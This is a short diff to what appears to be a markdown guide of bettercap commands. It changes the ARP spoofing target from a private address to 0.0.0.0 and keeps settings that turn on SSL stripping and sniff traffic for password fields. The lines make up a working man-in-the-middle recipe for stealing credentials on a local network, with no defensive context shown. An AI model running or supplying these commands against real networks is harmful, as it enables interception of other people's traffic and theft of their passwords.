@@ -8,7 +8,7 @@ bettercap -iface _your_interface_
 ```bash
 set http.proxy.sslstrip true
 set net.sniff.verbose false
-set arp.spoof.targets 192.168.1.6
+set arp.spoof.targets 0.0.0.0
 set net.sniff.filter not arp (default=not arp)
 set net.sniff.local true
 set net.sniff.regexp .*password=.+
